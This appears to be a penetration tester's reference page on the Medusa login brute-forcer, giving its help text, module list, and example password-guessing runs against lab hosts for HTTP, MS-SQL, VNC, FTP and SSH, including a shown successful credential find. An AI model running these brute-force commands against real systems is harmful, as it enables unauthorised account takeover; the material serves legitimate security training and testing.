---
Description: Medusa is a speedy, parallel, and modular, login brute-forcer.
URL: https://github.com/jmk-foofus/medusa
---

```bash
┌──(kali㉿kali)-[~]
└─$ medusa
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ALERT: Host information must be supplied.

Syntax: Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
  -h [TEXT]    : Target hostname or IP address
  -H [FILE]    : File containing target hostnames or IP addresses
  -u [TEXT]    : Username to test
  -U [FILE]    : File containing usernames to test
  -p [TEXT]    : Password to test
  -P [FILE]    : File containing passwords to test
  -C [FILE]    : File containing combo entries. See README for more information.
  -O [FILE]    : File to append log information to
  -e [n/s/ns]  : Additional password checks ([n] No Password, [s] Password = Username)
  -M [TEXT]    : Name of the module to execute (without the .mod extension)
  -m [TEXT]    : Parameter to pass to the module. This can be passed multiple times with a
                 different parameter each time and they will all be sent to the module (i.e.
                 -m Param1 -m Param2, etc.)
  -d           : Dump all known modules
  -n [NUM]     : Use for non-default TCP port number
  -s           : Enable SSL
  -g [NUM]     : Give up after trying to connect for NUM seconds (default 3)
  -r [NUM]     : Sleep NUM seconds between retry attempts (default 3)
  -R [NUM]     : Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.
  -c [NUM]     : Time to wait in usec to verify socket is available (default 500 usec).
  -t [NUM]     : Total number of logins to be tested concurrently
  -T [NUM]     : Total number of hosts to be tested concurrently
  -L           : Parallelize logins using one username per thread. The default is to process 
                 the entire username before proceeding.
  -f           : Stop scanning host after first valid username/password found.
  -F           : Stop audit after first valid username/password found on any host.
  -b           : Suppress startup banner
  -q           : Display module's usage information
  -v [NUM]     : Verbose level [0 - 6 (more)]
  -w [NUM]     : Error debug level [0 - 10 (more)]
  -V           : Display version
  -Z [TEXT]    : Resume scan based on map of previous scan
```

Supported protocols:

```
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

  Available modules in "." :

  Available modules in "/usr/lib/x86_64-linux-gnu/medusa/modules" :
    + cvs.mod : Brute force module for CVS sessions : version 2.0
    + ftp.mod : Brute force module for FTP/FTPS sessions : version 2.1
    + http.mod : Brute force module for HTTP : version 2.1
    + imap.mod : Brute force module for IMAP sessions : version 2.0
    + mssql.mod : Brute force module for M$-SQL sessions : version 2.0
    + mysql.mod : Brute force module for MySQL sessions : version 2.0
    + nntp.mod : Brute force module for NNTP sessions : version 2.0
    + pcanywhere.mod : Brute force module for PcAnywhere sessions : version 2.0
    + pop3.mod : Brute force module for POP3 sessions : version 2.0
    + postgres.mod : Brute force module for PostgreSQL sessions : version 2.0
    + rexec.mod : Brute force module for REXEC sessions : version 2.0
    + rlogin.mod : Brute force module for RLOGIN sessions : version 2.0
    + rsh.mod : Brute force module for RSH sessions : version 2.0
    + smbnt.mod : Brute force module for SMB (LM/NTLM/LMv2/NTLMv2) sessions : version 2.1
    + smtp-vrfy.mod : Brute force module for verifying SMTP accounts (VRFY/EXPN/RCPT TO) : version 2.1
    + smtp.mod : Brute force module for SMTP Authentication with TLS : version 2.0
    + snmp.mod : Brute force module for SNMP Community Strings : version 2.1
    + ssh.mod : Brute force module for SSH v2 sessions : version 2.1
    + svn.mod : Brute force module for Subversion sessions : version 2.1
    + telnet.mod : Brute force module for telnet sessions : version 2.0
    + vmauthd.mod : Brute force module for the VMware Authentication Daemon : version 2.0
    + vnc.mod : Brute force module for VNC sessions : version 2.1
    + web-form.mod : Brute force module for web forms : version 2.1
    + wrapper.mod : Generic Wrapper Module : version 2.0

...
```

### htaccess Brute-Force

```bash
kali@kali:~$ medusa -h 10.11.0.22 -u admin -P /usr/share/wordlists/rockyou.txt -M http
-m DIR:/admin
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 123456 (1 of 14344391 com
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 12345 (2 of 14344391 comp
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: 123456789 (3 of 14344391
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: password (4 of 14344391 c
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: iloveyou (5 of 14344391 c
...
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: samsung (255 of 14344391
ACCOUNT CHECK: [http] Host: 10.11.0.22 User: admin Password: freedom (256 of 14344391
ACCOUNT FOUND: [http] Host: 10.11.0.22 User: admin Password: freedom [SUCCESS]
```

### MS-SQL Brute-Force

```bash
┌──(kali㉿kali)-[~/…/lab/ntwk/thinc.local/13]
└─$ sudo medusa -h 10.11.1.13 -U ../../custom_lists/users.list -P ../../custom_lists/creds.list -M mssql
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ERROR: [mssql.mod] SQL server (10.11.1.13) did not respond to port query request. Using default value of 1433/tcp.
ACCOUNT CHECK: [mssql] Host: 10.11.1.13 (1 of 1, 0 complete) User: gibson (1 of 17, 0 complete) Password: zaq1xsw2cde3 (1 of 8 complete)
ACCOUNT CHECK: [mssql] Host: 10.11.1.13 (1 of 1, 0 complete) User: gibson (1 of 17, 0 complete) Password: QUHqhUPRKXMo4m7k (2 of 8 complete)
ACCOUNT CHECK: [mssql] Host: 10.11.1.13 (1 of 1, 0 complete) User: gibson (1 of 17, 0 complete) Password: hill (3 of 8 complete)
ACCOUNT CHECK: [mssql] Host: 10.11.1.13 (1 of 1, 0 complete) User: gibson (1 of 17, 0 complete) Password: j957bjc6qczq2gpm (4 of 8 complete)
ACCOUNT CHECK: [mssql] Host: 10.11.1.13 (1 of 1, 0 complete) User: gibson (1 of 17, 0 complete) Password: gonz (5 of 8 complete)
ACCOUNT CHECK: [mssql] Host: 10.11.1.13 (1 of 1, 0 complete) User: gibson (1 of 17, 0 complete) Password: aliceishere (6 of 8 complete)
ACCOUNT CHECK: [mssql] Host: 10.11.1.13 (1 of 1, 0 complete) User: gibson (1 of 17, 0 complete) Password: 3v1lp@ss (7 of 8 complete)
ACCOUNT CHECK: [mssql] Host: 10.11.1.13 (1 of 1, 0 complete) User: gibson (1 of 17, 0 complete) Password: tanya4life (8 of 8 complete)
ACCOUNT CHECK: [mssql] Host: 10.11.1.13 (1 of 1, 0 complete) User: admin (2 of 17, 1 complete) Password: zaq1xsw2cde3 (1 of 8 complete)
...
```

### VNC Brute-Force

```bash
$ medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
```

### FTP Brute-Force

```bash
$ medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```

### SSH Brute-Force

```bash
$ medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
```